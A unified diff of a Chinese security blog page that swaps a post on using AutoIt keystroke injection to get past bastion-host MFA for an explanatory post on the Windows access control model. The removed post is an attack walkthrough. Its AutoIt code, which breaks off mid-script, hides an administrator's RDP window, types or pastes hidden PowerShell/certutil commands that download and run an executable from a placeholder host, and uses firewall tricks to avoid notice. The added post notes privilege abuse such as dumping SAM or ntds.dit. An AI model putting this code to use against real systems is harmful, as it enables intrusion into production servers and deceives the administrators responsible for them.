@@ -12,7 +12,7 @@
     
     <meta http-equiv="Cache-Control" content="no-siteapp" />
 
-    <title>AutoIt SendKey绕过堡垒机两步验证 | MYZXCG</title>
+    <title>Windows 访问控制模型（一） | MYZXCG</title>
 
     <link rel="stylesheet" href="/css/meme.min.248ffc922f6c9975e8625f71e7ebc1a9e2180e744b9528665612bf7c124dea69.css"/>
 
@@ -27,7 +27,7 @@
         <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
         <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
 
-    <meta name="author" content="myzxcg" /><meta name="description" content="利用环境 阿里云云盾堡垒机后是Windows server的生产环境机器，运维通过rdp……" />
+    <meta name="author" content="myzxcg" /><meta name="description" content="此文于2022年1月28日更新。 本文主要讲述基本的概念。内容参考 微软文档 访问控制是指……" />
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
     <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
@@ -47,22 +47,22 @@
     
 
     
-    <link rel="canonical" href="https://myzxcg.com/2021/01/AutoIt-SendKey%E7%BB%95%E8%BF%87%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%B8%A4%E6%AD%A5%E9%AA%8C%E8%AF%81/" />
+    <link rel="canonical" href="https://myzxcg.com/2021/08/Windows-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B%E4%B8%80/" />
     
 
 <script type="application/ld+json">
     {
         "@context": "https://schema.org",
         "@type": "BlogPosting",
-        "datePublished": "2021-01-16T17:15:39+08:00",
-        "dateModified": "2021-11-20T12:57:53+08:00",
-        "url": "https://myzxcg.com/2021/01/AutoIt-SendKey%E7%BB%95%E8%BF%87%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%B8%A4%E6%AD%A5%E9%AA%8C%E8%AF%81/",
-        "headline": "AutoIt SendKey绕过堡垒机两步验证",
-        "description": "利用环境 阿里云云盾堡垒机后是Windows server的生产环境机器，运维通过rdp……",
+        "datePublished": "2021-08-28T20:08:06+08:00",
+        "dateModified": "2022-02-07T19:36:06+08:00",
+        "url": "https://myzxcg.com/2021/08/Windows-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B%E4%B8%80/",
+        "headline": "Windows 访问控制模型（一）",
+        "description": "此文于2022年1月28日更新。 本文主要讲述基本的概念。内容参考 微软文档 访问控制是指……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  1794 ,
-        "image": ["https://myzxcg.com/images/image-20210116213501668.png","https://myzxcg.com/images/image-20210116184509174.png"],
+        "wordCount":  8175 ,
+        "image": ["https://myzxcg.com/images/16433580162615.jpg","https://myzxcg.com/images/16433586167313.jpg","https://myzxcg.com/images/16433586650422.jpg"],
         "author": {
             "@type": "Person",
             "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
@@ -100,14 +100,14 @@
 
 
 
-<meta property="og:title" content="AutoIt SendKey绕过堡垒机两步验证" />
-<meta property="og:description" content="利用环境 阿里云云盾堡垒机后是Windows server的生产环境机器，运维通过rdp……" />
-<meta property="og:url" content="https://myzxcg.com/2021/01/AutoIt-SendKey%E7%BB%95%E8%BF%87%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%B8%A4%E6%AD%A5%E9%AA%8C%E8%AF%81/" />
+<meta property="og:title" content="Windows 访问控制模型（一）" />
+<meta property="og:description" content="此文于2022年1月28日更新。 本文主要讲述基本的概念。内容参考 微软文档 访问控制是指……" />
+<meta property="og:url" content="https://myzxcg.com/2021/08/Windows-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B%E4%B8%80/" />
 <meta property="og:site_name" content="MYZXCG" />
-<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/image-20210116213501668.png" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/16433580162615.jpg" />
 <meta property="og:type" content="article" />
-    <meta property="article:published_time" content="2021-01-16T17:15:39&#43;08:00" />
-    <meta property="article:modified_time" content="2021-11-20T12:57:53&#43;08:00" />
+    <meta property="article:published_time" content="2021-08-28T20:08:06&#43;08:00" />
+    <meta property="article:modified_time" content="2022-02-07T19:36:06&#43;08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -211,7 +211,7 @@
 
         <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
 
-            <h1 class="post-title p-name">AutoIt SendKey绕过堡垒机两步验证</h1>
+            <h1 class="post-title p-name">Windows 访问控制模型（一）</h1>
 
             
 
@@ -225,7 +225,7 @@
 <div class="post-meta">
     
         
-        <time datetime="2021-01-16T17:15:39&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.1.16</time>
+        <time datetime="2021-08-28T20:08:06&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.8.28</time>
     
     
     
@@ -239,7 +239,7 @@
     
     
         
-        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;4&nbsp;分钟</span>
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;17&nbsp;分钟</span>
     
 
    
@@ -253,183 +253,657 @@
 
             <nav class="contents">
   <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
-    <li><a id="contents:利用环境" href="#利用环境">利用环境</a></li>
-    <li><a id="contents:sendkey" href="#sendkey">SendKey</a></li>
-    <li><a id="contents:利用思路" href="#利用思路">利用思路</a>
+    <li><a id="contents:访问令牌" href="#访问令牌">访问令牌</a>
       <ol>
-        <li><a id="contents:细节处理" href="#细节处理">细节处理</a></li>
-        <li><a id="contents:注意事项" href="#注意事项">注意事项</a></li>
+        <li><a id="contents:模拟令牌" href="#模拟令牌">模拟令牌</a></li>
+        <li><a id="contents:受限令牌" href="#受限令牌">受限令牌</a></li>
+        <li><a id="contents:令牌中的特权" href="#令牌中的特权">令牌中的特权</a></li>
+        <li><a id="contents:令牌的利用" href="#令牌的利用">令牌的利用</a></li>
       </ol>
     </li>
-    <li><a id="contents:autoit代码" href="#autoit代码">AutoIt代码</a></li>
+    <li><a id="contents:安全描述符" href="#安全描述符">安全描述符</a>
+      <ol>
+        <li><a id="contents:为新对象创建权限" href="#为新对象创建权限">为新对象创建权限</a></li>
+        <li><a id="contents:acl" href="#acl">ACL</a></li>
+        <li><a id="contents:ace" href="#ace">ACE</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:访问掩码与-sid" href="#访问掩码与-sid">访问掩码与 SID</a>
+      <ol>
+        <li><a id="contents:访问掩码" href="#访问掩码">访问掩码</a></li>
+        <li><a id="contents:安全标识符sid" href="#安全标识符sid">安全标识符（SID）</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:权限检查的过程" href="#权限检查的过程">权限检查的过程</a></li>
+    <li><a id="contents:安全描述符定义语言" href="#安全描述符定义语言">安全描述符定义语言</a></li>
   </ol>
 </nav><div class="post-body e-content">
-                <h2 id="利用环境"><a href="#利用环境" class="anchor-link">#</a><a href="#contents:利用环境" class="headings">利用环境</a></h2>
-<p>阿里云云盾堡垒机后是Windows server的生产环境机器，运维通过rdp到云盾堡垒机，再去选择服务器连接。虽然有了堡垒机的账号密码，但登录云盾堡垒机需要两步验证码，又没办法获取到运维的MFA，所以无法直接登录。在这种情况下，可通过SendKey的方式，来获取线上服务器权限。</p>
-<p><a href="https://help.aliyun.com/document_detail/143796.html?spm=a2c4g.11186623.6.630.16a75d77mxpd7B" target="_blank" rel="noopener">RDP协议运维 - 堡垒机 - 阿里云</a></p>
-<p>运维登录过程：从本机RDP到跳板机（windows server 2012 R2） ==&gt; 通过跳板机再RDP到阿里云堡垒机（输入堡垒机账号和两步验证码）==&gt; 堡垒机再走rdp协议连接到线上服务器。</p>
-<p>其中跳板机可控，目标有一个普通用户专门用来连接堡垒机。</p>
-<h2 id="sendkey"><a href="#sendkey" class="anchor-link">#</a><a href="#contents:sendkey" class="headings">SendKey</a></h2>
-<p>SendKey其实就是发送键盘指令。Windows下可以通过向某个窗口发送键盘指令来执行命令。</p>
-<p>例如发送WIN+R打开运行窗口，再发送cmd就会弹出命令行窗口。这个过程就像你自己在键盘上按WIN+R，打开cmd的方式一样。</p>
-<p><img src="/images/image-20210116213501668.png" alt=""></p>
-<p>mstsc程序的键盘设置必须是在远程计算机上。这样发送组合键才会发送到RDP的窗口去。</p>
-<p><img src="/images/image-20210116184509174.png" alt=""></p>
-<p>推荐使用<a href="https://www.autoitscript.com/site/" target="_blank" rel="noopener">AutoIt</a>来编写SendKey的程序。除此之外还有powershell版的<a href="https://archive.codeplex.com/?p=wasp" target="_blank" rel="noopener">WASP</a>来SendKey，但是WASP不如AutoIt的可定制化程度高。</p>
-<p><strong>整体的思路是：</strong> 当运维登录堡垒机时(已经连上了线上服务器，即开启了RDP窗口)，在跳板机执行AutoIt编写的exe，就会向堡垒机的RDP窗口发送键盘指令。比如发送WIN+R之后紧接着发送</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">POWERSHELL</span> <span class="n">-WINDOWSTYLE</span> <span class="n">HIDDEN</span> <span class="n">-C</span> <span class="s2">&#34;CERTUTIL -URLCACHE -SPLIT -F HTTPS://xxx.com/xxx.exe C:/WINDOWS/TASKS/xxx.exe;C:/WINDOWS/TASKS/xxx.exe&#34;</span>
-</code></pre></td></tr></table></div>
-</div>
-</div><p>来下载exe并执行。过程很简单，但是有很多细节和坑点需要注意，下面细说一下，代码在最后。</p>
-<h2 id="利用思路"><a href="#利用思路" class="anchor-link">#</a><a href="#contents:利用思路" class="headings">利用思路</a></h2>
-<p>当运维登录堡垒机时(已经连上了线上服务器，即开启了RDP窗口)，在跳板机执行AutoIt编写的exe，就会向堡垒机的RDP窗口发送键盘指令。</p>
-<p>比如发送WIN+R之后，紧接着发送</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">POWERSHELL</span> <span class="n">-WINDOWSTYLE</span> <span class="n">HIDDEN</span> <span class="n">-C</span> <span class="s2">&#34;CERTUTIL -URLCACHE -SPLIT -F &lt;HTTPS://xxx.com/xxx.exe&gt; C:/WINDOWS/TASKS/xxx.exe;C:/WINDOWS/TASKS/xxx.exe&#34;</span>
-</code></pre></td></tr></table></div>
-</div>
-</div><p>即可下载exe并执行。过程很简单，但是有很多细节和坑点需要注意，下面主要细说一下，代码在最后。</p>
-<h3 id="细节处理"><a href="#细节处理" class="anchor-link">#</a><a href="#contents:细节处理" class="headings">细节处理</a></h3>
-<p>在发送指令的过程中不能被干扰，如果在SendKey的时候，RDP窗口内的聚焦不在WIN+R打开的运行窗口或cmd.exe的窗口内，那么就会输入到其他地方。并且还有最重要的一点要处理：总不能当着管理员的面WIN+R弹个框，输入一堆命令执行吧–_–</p>
-<p><strong>解决办法</strong></p>
+                <p><strong>此文于2022年1月28日更新。</strong></p>
+<blockquote>
+<p>本文主要讲述基本的概念。内容参考 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/authorization-portal" target="_blank" rel="noopener">微软文档</a></p>
+</blockquote>
+<p>访问控制是指控制用户访问操作系统资源。 使用访问控制模型可以控制进程访问安全对象或执行各种系统管理任务。</p>
+<p>访问控制模型有两个基本部分：</p>
 <ol>
-<li>可以在发送指令的时候先隐藏这个RDP窗口(不是最小化，是直接隐藏这个窗口)，AutoIt可以实现。这样管理员无法操控和看到这个窗口，如果你有跳板机的管理员权限，甚至可以禁用键盘输入。这样更不容易影响SendKey的过程。整个过程执行完，运维看到窗口消失的时间大概3-4秒。</li>
-<li>在SendKey的过程中，可以在跳板机上添加一条防火墙，阻断目标对跳板机的连接，也就3-4秒时间，之后再给他恢复就好了。</li>
+<li>访问令牌—其中包含已登录用户的相关信息。</li>
+<li>安全描述符—其中包含安全对象的相关安全信息。</li>
 </ol>
-<p>在有跳板机管理员权限的情况下，推荐第二种。这样可能以为是网络波动暂时断了而已，第一种方法窗口突然消失，次数多了，管理员会去排查问题。</p>
-<h3 id="注意事项"><a href="#注意事项" class="anchor-link">#</a><a href="#contents:注意事项" class="headings">注意事项</a></h3>
+<p>这里的安全对象包括: NTFS卷上的文件和目录、注册表项、网络共享、服务、进程、Active Directory 对象等。</p>
+<h2 id="访问令牌"><a href="#访问令牌" class="anchor-link">#</a><a href="#contents:访问令牌" class="headings">访问令牌</a></h2>
+<p>访问令牌是描述进程或线程的安全上下文的对象。 用户登录后，系统（LSA）将生成访问令牌。 之后以该用户执行的每一个进程都有此访问令牌的副本。</p>
+<p>当线程与安全对象进行交互或尝试执行需要特权的任务时，系统使用访问令牌来标识用户。</p>
+<p>访问令牌包含以下信息:</p>
+<pre tabindex="0"><code>用户的SID
+用户所属组的SID
+标识当前登录会话的登录SID
+用户或用户组所拥有的权限列表
+所有者的SID
+主要组的SID
+用户在不指定安全描述符的情况下创建安全对象时系统使用的默认DACL
+访问令牌的来源
+是主要令牌还是模拟令牌
+受限制SID的列表
+当前的模拟级别
+其他数据
+</code></pre><h3 id="模拟令牌"><a href="#模拟令牌" class="anchor-link">#</a><a href="#contents:模拟令牌" class="headings">模拟令牌</a></h3>
+<p>每个进程都有一个主令牌，用于描述与进程所关联用户的安全上下文。 默认情况下，进程的线程将使用主令牌与安全对象交互。</p>
+<p>此外，线程可以模拟客户端帐户（其实可以理解为这台机器上的其他账户）。 模拟时允许线程使用客户端的安全上下文与安全对象进行交互。 模拟客户端的线程同时具有主令牌和模拟令牌。</p>
+<p>模拟令牌的完整性级别必须小于或等于调用进程的完整性级别，否则模拟调用将失败。比如在开启UAC的情况下只能模拟未提升权限的（过滤的）中等完整性令牌。</p>
+<h3 id="受限令牌"><a href="#受限令牌" class="anchor-link">#</a><a href="#contents:受限令牌" class="headings">受限令牌</a></h3>
+<p>受限令牌是由CreateRestrictedToken函数修改的主令牌或模拟令牌。 在受限令牌的安全上下文中，运行的进程或模拟线程会被限制访问安全对象或执行特权操作。</p>
+<p>可通过以下方式对令牌权限进行限制：</p>
+<ol>
+<li>删除令牌中的权限</li>
+<li>将&quot;仅拒绝&quot;属性应用于令牌中的 sid，使其不能用于访问受保护的对象。</li>
+<li>指定受限制的sid列表，该列表可限制对安全对象的访问</li>
+</ol>
+<p>受限制的进程或线程尝试访问某个安全对象时，系统会执行两次访问检查：一个是所使用令牌的 sid，另一个是受限制的sid 列表。 当这两个访问检查都通过时，才授予访问权限。</p>
+<p><strong>访问令牌中的 SID</strong></p>
+<p>访问令牌中的用户和组的SID都有一组属性，系统在收到访问请求时会对其进行检查。如下:</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>属性</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SE_GROUP_ENABLED</td>
+<td>当系统执行访问检查时，如果启用了该属性，它会检查允许访问和拒绝访问的ACE 条目。没有设置该属性的SID 会在权限检查时被忽略。</td>
+</tr>
+<tr>
+<td>SE_GROUP_USE_FOR_DENY_ONLY</td>
+<td>具有此属性的 SID 代表仅拒绝 SID。当系统执行访问检查时，它会忽略允许此 SID访问的 ACE，只检查拒绝此 SID访问的 ACE。如果设置了此属性，则 SE_GROUP_ENABLED 属性无效。</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>对访问令牌的修改权限</strong></p>
+<p>对访问令牌的修改权限由令牌中的安全描述符控制。系统会根据安全描述符中的DACL 检查请求的访问权限。可使用<code>GetKernelObjectSecurity</code>和<code>SetKernelObjectSecurity</code>函数为访问令牌设置安全描述符。</p>
+<p>下面是针对访问令牌的操作权限:</p>
+<ul>
+<li>访问令牌支持<code>DELETE, READ_CONTROL, WRITE_DAC, WRITE_OWNER</code> 这些标准权限。 不支持<code>SYNCHRONIZE</code>权限。</li>
+<li><code>ACCESS_SYSTEM_SECURITY</code> 权限用于在令牌的安全描述符中访问或修改SACL。</li>
+<li>更详细的操作令牌的权限，参考<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects" target="_blank" rel="noopener">微软官方文档</a>。</li>
+</ul>
+<h3 id="令牌中的特权"><a href="#令牌中的特权" class="anchor-link">#</a><a href="#contents:令牌中的特权" class="headings">令牌中的特权</a></h3>
+<p>参考: <a href="https://www.anquanke.com/post/id/254165" target="_blank" rel="noopener">https://www.anquanke.com/post/id/254165</a></p>
+<p>某些特权可以使用户绕过内核中对给定对象的访问检查。</p>
+<p>这里的特权指令牌中的“用户或用户组所拥有的权限列表”。</p>
+<p>特权是一个用户或组在本地计算机执行各种系统相关操作（关闭系统、装载设备驱动程序、改变系统时间）的权限，特权与访问权限的区别如下：</p>
+<ul>
+<li>特权控制账户对系统资源和系统相关任务的访问，而访问权限控制对安全对象（可以具有安全描述符的对象）的访问</li>
+<li>系统管理员为用户或组指派特权，而系统根据对象的DACL中的ACE授予或拒绝对安全对象的访问，有时拥有特权可以忽略ACL的检查</li>
+</ul>
+<p><img src="/images/16433580162615.jpg" alt=""></p>
+<p><strong>关键特权介绍</strong></p>
 <ol>
 <li>
-<p>SendKey的方式，并不是百分百成功率。</p>
-<p>某种极端情况：假如把运维的连接的rdp窗口隐藏后，运维疯狂按键盘，这种是百分百失败（WIN+R那里输入的字符串会乱，但疯狂点鼠标不会有影响）。所以最好拿到跳板机的管理员权限，这样可以通过禁用键盘输入来提高成功率。保险起见还可以加上防火墙规则，使跳板机与服务器之间的状态变为正在连接，这时再来执行。</p>
+<p><strong>SeDebugPrivilege</strong></p>
+<p>通常情况下，用户只对属于自己的进程有调试的权限，但如果该用户Token中被赋予<code>SeDebugPrivilege</code>并启用时，该用户就拥有了调试其他用户进程的权限，此时就可以对一些高权限进程执行操作以获取对应的权限。</p>
+<p>有此特权的令牌，Windows内核将跳过对任何进程和线程对象的DACL检查。</p>
 </li>
 <li>
-<p>阿里云堡垒机默认有录屏功能，如果目标去查看录像，就很容易被发现。</p>
+<p><strong>SeBackupPrivilege</strong></p>
+<p>该特权代表需要执行备份操作的权限，授予当前用户对所有文件的读取权限，不受文件原本的ACL限制，主要有以下利用思路：</p>
+<ul>
+<li>备份SAM数据库</li>
+<li>备份磁盘上高权限用户的敏感文件</li>
+<li>域内在域控上备份ntds.dit</li>
+</ul>
+</li>
+<li>
+<p><strong>SeImpersonatePrivilege</strong></p>
+<p>当<code>SeImpersonatePrivilege</code>特权分配给用户时，表示允许该用户运行的程序模拟客户端，默认Service账户（如MSSQL、IIS的服务账户）和管理员账户会拥有该权限。该权限也是一些potato提权的重要条件。</p>
+</li>
+<li>
+<p><strong>SeEnableDelegationPrivilege</strong></p>
+<p>想要配置无约束委派或约束委派，不仅需要对<code>userAccountControl</code>属性有写权限，还需要在域控有<code>SeEnableDelegationPrivilege</code>特权。</p>
+<p>利用方法参考: <a href="https://www.notion.so/9adb8ad2befc4ab8b537a13c39c12bbf" target="_blank" rel="noopener">组策略利用</a></p>
 </li>
 </ol>
-<h2 id="autoit代码"><a href="#autoit代码" class="anchor-link">#</a><a href="#contents:autoit代码" class="headings">AutoIt代码</a></h2>
-<p><strong>第一版</strong></p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#include &lt;AutoItConstants.au3&gt;</span>
-<span class="n">Local</span> <span class="nv">$aList</span> <span class="p">=</span> <span class="n">WinList</span><span class="p">(</span><span class="s2">&#34;192.168.1.1:3389 - 远程桌面连接&#34;</span><span class="p">)</span>
-<span class="k">For</span> <span class="nv">$i</span> <span class="p">=</span> <span class="n">1</span> <span class="n">To</span> <span class="nv">$aList</span><span class="p">[</span><span class="n">0</span><span class="p">][</span><span class="n">0</span><span class="p">]</span>
-   <span class="n">Example</span><span class="p">(</span><span class="nv">$aList</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="n">1</span><span class="p">]))</span>
-   <span class="n">sleep</span><span class="p">(</span><span class="n">8000</span><span class="p">)</span>
-<span class="n">Next</span>
-<span class="n">Func</span> <span class="n">Example</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">)</span>
-  <span class="n">Local</span> <span class="nv">$iState</span> <span class="p">=</span> <span class="n">WinGetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">);</span><span class="n">判断是否是最小化</span>
-  <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_HIDE</span><span class="p">)</span>
-  <span class="n">SendKeepActive</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">)</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;#r&#34;</span><span class="p">)</span>
-  <span class="n">sleep</span><span class="p">(</span><span class="n">800</span><span class="p">)</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{DEL 2}&#34;</span><span class="p">)</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{SHIFTDOWN}&#34;</span><span class="p">);</span><span class="n">全部大写</span><span class="err">，</span><span class="n">是为了解决输入法的问题</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{SHIFTUP}&#34;</span><span class="p">)</span>
-  <span class="n">sleep</span><span class="p">(</span><span class="n">800</span><span class="p">)</span>
-  <span class="n">Opt</span><span class="p">(</span><span class="s2">&#34;SendKeyDelay&#34;</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s1">&#39;POWERSHELL{SPACE}{SPACE}-WINDOWSTYLE{SPACE}{SPACE}HIDDEN{SPACE}{SPACE}-C{SPACE}{SPACE}&#34;CERTUTIL{SPACE}{SPACE}-URLCACHE{SPACE}{SPACE}-SPLIT{SPACE}{SPACE}-F{SPACE}{SPACE}HTTPS://XXX.com/XXX.PNG{SPACE}{SPACE}C:/WINDOWS/TASKS/XXX.EXE;C:/WINDOWS/TASKS/XXX.EXE&#34;&#39;</span><span class="p">)</span>
-  <span class="n">Sleep</span><span class="p">(</span><span class="n">500</span><span class="p">)</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{enter}{enter}&#34;</span><span class="p">)</span>
-  <span class="n">sleep</span><span class="p">(</span><span class="n">500</span><span class="p">)</span>
-  <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_SHOW</span><span class="p">)</span>
-  <span class="k">If</span> <span class="n">BitAND</span><span class="p">(</span><span class="nv">$iState</span><span class="p">,</span> <span class="nv">$WIN_STATE_MINIMIZED</span><span class="p">)</span> <span class="n">Then</span>
-     <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_MINIMIZE</span><span class="p">)</span>
-  <span class="n">EndIf</span>
-<span class="n">EndFunc</span>
-</code></pre></td></tr></table></div>
-</div>
-</div><p><strong>第二版</strong></p>
-<p>上面的代码利用的Sendkey单个字符串的逐步发送（就像敲键盘一样），有一定的输入时间，并且输入过程容易受到干扰导致字符串出错。</p>
-<p>经过一阵摸索后，发现可以利用剪贴板，来直接进行粘贴复制，速度相比以前快了很多，还不用关心目标系统上输入法的问题（如果隐藏窗口的话，窗口消失就1s）。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#include &lt;AutoItConstants.au3&gt;</span>
-<span class="n">ClipPut</span><span class="p">(</span><span class="s2">&#34;POWERSHELL -W HIDDEN -C IWR HTTPS://xxx.COM/xx.CAB -OUTF $ENV:TMP/xx.CAB;EXPAND $ENV:TMP/xx.CAB -F:* $ENV:TMP;&amp;$ENV:TMP/xx.exe&#34;</span><span class="p">)</span>
-<span class="n">Local</span> <span class="nv">$hWnd</span><span class="p">=</span><span class="n">HWnd</span><span class="p">(</span><span class="nv">$CmdLine</span><span class="p">[</span><span class="n">1</span><span class="p">])</span> <span class="p">;</span><span class="n">handle</span>
-<span class="n">ControlFocus</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
